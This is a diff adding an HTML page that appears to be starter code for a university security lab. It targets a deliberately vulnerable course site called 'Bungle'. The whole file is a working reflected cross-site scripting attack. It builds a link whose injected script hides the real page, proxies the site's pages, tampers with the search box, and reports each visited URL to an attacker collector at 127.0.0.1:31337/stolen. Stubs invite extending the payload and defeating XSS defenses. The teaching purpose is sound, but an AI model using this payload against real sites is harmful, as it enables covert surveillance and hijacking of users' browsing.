@@ -1,0 +1,35 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+// Extend this function:
+function payload(attacker) {
+    function log(data) {
+        console.log($.param(data))
+        $.get(attacker, data);
+    }
+    function proxy(href) {
+        $("html").load(href, function(){
+            $("html").show();
+            log({event: "nav", url: href});
+            $("#query").val("pwned!");
+}); }
+    $("html").hide();
+    proxy("./");
+}
+function makeLink(xssdefense, target, attacker) {
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<script" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</script" + ">");
+    } else {
+        // Implement code to defeat XSS defenses here.
+} }
+var xssdefense = 0;
+var target = "http://bungle-cs461.cs.illinois.edu/";
+var attacker = "http://127.0.0.1:31337/stolen";
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+</script>
+<h3></h3>
